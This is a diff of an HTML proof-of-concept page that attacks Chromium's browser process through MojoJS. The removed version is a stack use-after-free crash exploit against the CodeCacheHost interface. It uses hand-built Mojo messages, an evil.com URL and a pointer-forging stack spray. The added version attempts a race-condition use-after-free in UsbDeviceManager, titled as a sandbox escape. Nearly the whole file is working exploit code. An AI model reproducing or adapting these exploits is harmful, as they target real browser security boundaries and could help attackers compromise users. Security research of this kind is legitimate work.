@@ -1,90 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chromium IPC - Stack UAF Crash PoC</title>
+    <title>MojoJS Sandbox Escape</title>
+    <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>Browser Process Stack UAF -> Crash</h1>
-    <p>Status: <b id="status">Ready</b></p>
-    <button id="launch">Trigger Stack UAF Crash</button>
+    <h1>Hunting the Browser Process</h1>
+    <script type="module">
+        // 2. Import the ES6 module from your exact path
+        // In modern Mojo bindings, interfaces export a "Remote" class
+        import { UsbDeviceManagerRemote, UsbDeviceManager } from './gen/services/device/public/mojom/usb_manager.mojom.m.js';
 
-    <script>
-        const TARGET_URL = "https://evil.com/target.js";
-        
-        async function pwn() {
-            const status = document.getElementById('status');
-            status.innerText = "Step 1: Connecting to CodeCacheHost...";
-
-            const pipe = Mojo.createMessagePipe();
-            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
-            const host = pipe.handle0;
-
-            // 1. Create a dummy payload
-            const dummyPayload = new Uint8Array(100);
-            const bufferSize = dummyPayload.byteLength;
-            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
-            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
-            new Uint8Array(mapping.buffer).set(dummyPayload);
-
-            // 2. Build the Trigger Message (DidGenerateCacheableMetadata)
-            const triggerMsg = new ArrayBuffer(184);
-            const v = new DataView(triggerMsg);
-            v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
-            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
-            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
-            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
-            
-            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
-            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
-            
-            v.setUint32(144, 16, true); v.setBigUint64(152, 0n, true); 
-            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);
-
-            // 3. Build the Stack Spray Message
-            // We use FetchCachedCode with a huge URL string to force the Browser Process 
-            // to allocate large buffers on the stack while processing the Mojo message.
-            // We fill it with 'A's (0x41) to forge fake pointers.
-            const SPRAY_STR = "https://evil.com/" + "A".repeat(1024) + ".js";
-            
-            // Mojo structs must be 8-byte aligned. 
-            const alignedStrLen = Math.ceil(SPRAY_STR.length / 8) * 8;
-            const sprayMsg = new ArrayBuffer(88 + alignedStrLen); 
-            const fv = new DataView(sprayMsg);
-            
-            fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
-            fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
-            fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
-            fv.setBigUint64(24, 1n, true); 
-
-            fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
-            fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
-            fv.setBigUint64(48, 8n, true); 
-
-            fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
-            fv.setBigUint64(64, 8n, true); 
-            
-            fv.setUint32(72, 8 + SPRAY_STR.length, true); 
-            fv.setUint32(76, SPRAY_STR.length, true); 
-            for(let i = 0; i < SPRAY_STR.length; i++) {
-                fv.setUint8(80 + i, SPRAY_STR.charCodeAt(i)); 
-            } 
-
-            status.innerText = "Step 2: Firing Trigger and Spraying Stack...";
-            
-            // 4. THE ATTACK
-            // Fire the trigger to create the dangling span
-            host.writeMessage(triggerMsg, [sharedBuffer.handle]);
-
-            // Immediately spam the stack with fake pointers
-            for (let i = 0; i < 10000; i++) {
-                fv.setBigUint64(24, BigInt(i + 2), true); 
-                host.writeMessage(sprayMsg, []);
+        async function triggerExploit() {
+            if (typeof Mojo === 'undefined') {
+                console.error("[-] MojoJS not found. Did you launch with --enable-blink-features=MojoJS?");
+                return;
             }
 
-            status.innerText = "Step 3: Waiting for Background Thread Crash...";
+            console.log("[*] Grooming the Browser Heap...");
+            let managers = [];
+            
+            // 3. Instantiate multiple managers to ensure reliable heap placement
+            for(let i = 0; i < 50; i++) {
+                let usbManagerRemote = new UsbDeviceManagerRemote();
+                
+                // Bind the interface. $interfaceName is auto-generated in the .m.js file.
+                Mojo.bindInterface(
+                    UsbDeviceManager.$interfaceName, 
+                    usbManagerRemote.$.bindNewPipeAndPassReceiver().handle
+                );
+                managers.push(usbManagerRemote);
+            }
+
+            console.log("[+] Bound 50 Mojo pipes to Browser Process.");
+            console.log("[*] Triggering async hardware requests...");
+            
+            // 4. Call GetDevices. This tells the C++ backend to scan the USB bus asynchronously.
+            for(let m of managers) {
+                m.getDevices().catch(e => {}); 
+            }
+
+            // 5. THE RACE CONDITION: Wait just 1 millisecond.
+            // We want the C++ backend to start the USB scan, but we want to kill 
+            // the object before the scan finishes.
+            await new Promise(r => setTimeout(r, 1)); 
+
+            console.log("[!] TRIGGERING FREE: Severing pipes...");
+            
+            // 6. The Kill: Close the pipes. 
+            // This signals the Browser Process to destroy the UsbDeviceManagerImpl C++ objects.
+            for(let m of managers) {
+                m.$.close();
+            }
+
+            // 7. Force garbage collection in the renderer to ensure cleanup
+            if (window.gc) { window.gc(); }
+
+            console.log("[?] Payload delivered. If the C++ callback is flawed, the Browser Process will crash now.");
         }
 
-        document.getElementById('launch').onclick = pwn;
+        triggerExploit();
     </script>
 </body>
 </html>
